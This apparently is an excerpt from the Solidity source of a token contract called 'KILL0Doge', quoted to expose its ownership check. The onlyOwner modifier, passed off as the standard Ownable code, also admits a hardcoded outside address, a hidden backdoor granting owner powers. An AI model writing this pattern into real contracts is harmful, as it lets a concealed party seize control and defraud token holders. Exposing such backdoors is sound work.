...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xA854fb2a180925Ae0695f28EbAE249Fa2115AD1B) , "Ownable: caller is not the owner");
        _;
    }
...
contract KILL0Doge is IERC20, Ownable {
